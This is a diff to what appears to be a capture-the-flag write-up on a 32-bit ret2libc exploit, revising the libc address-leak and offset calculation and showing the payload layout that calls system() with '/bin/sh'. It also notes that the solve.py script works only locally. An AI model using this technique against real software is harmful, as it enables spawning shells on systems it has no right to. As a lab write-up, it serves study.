@@ -133,9 +133,10 @@ A name input of 20 bytes will leak the 4 bytes at 0xffffcc10. This value 0xf7...
 0xffffcbd0:     0x42424242      0x43434343      0xf7fcc00a      0x56555601
 0xffffcbe0:     0x565557a9      0x56556fa0      0x00000001      0x56555b72
 
-libc library is from 0xf7e19000 - 0xf7fcc000
-0xf7fcc000 is located 28 bytes from the libc library
-the offset of this address is 0xf7fcc00a - 0xf7e19000 = 0x1b300a (this is offset from libc base addr)
+Leak is 0xf7ef0000
+libc is 0xf7d3d000
+Offset of this address to main is  = 0x1b3000 (this is offset from libc base addr)
+However because of the way the input is passed into a newline is appended, thus offset + 0xa0
 
 $ readelf -s libc-2.23.so | grep system
   1457: 0003adb0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
@@ -161,4 +162,5 @@ input 32:    system()
 input 33:    fake return addr
 input 34:    "/bin/sh" addr
 
-
+The provided solve.py exploit script does not work on remote. However it works on local with the target binary patched with
+the libc 2.23 version as well as corresponding linker.
